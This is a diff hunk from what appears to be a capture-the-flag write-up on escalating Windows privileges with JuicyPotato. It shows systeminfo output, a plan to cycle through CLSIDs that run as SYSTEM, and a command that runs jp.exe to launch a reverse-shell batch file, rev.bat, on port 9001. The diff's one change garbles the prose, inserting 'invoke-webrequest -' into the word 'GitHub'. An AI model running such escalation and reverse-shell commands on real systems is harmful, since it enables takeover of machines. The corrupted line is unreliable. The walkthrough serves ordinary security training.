@@ -810,7 +810,7 @@ Network Card(s):           1 NIC(s) Installed.
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
 ```
 
-I can go to the [JuicyPotato GitHub](https://github.com/ohpe/juicy-potato/tree/master/CLSID) and find a [list of CLSIDs for Windows 10 Enterprise](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise). I’ll try a few that run as “NT AUTHORITY\SYSTEM” until I get one to work.
+I can go to the [JuicyPotato Git invoke-webrequest -Hub](https://github.com/ohpe/juicy-potato/tree/master/CLSID) and find a [list of CLSIDs for Windows 10 Enterprise](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise). I’ll try a few that run as “NT AUTHORITY\SYSTEM” until I get one to work.
 
 ```console
 C:\users\Destitute\appdata\local\Temp>jp.exe -t * -p \users\Destitute\appdata\local\Temp\rev.bat -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}
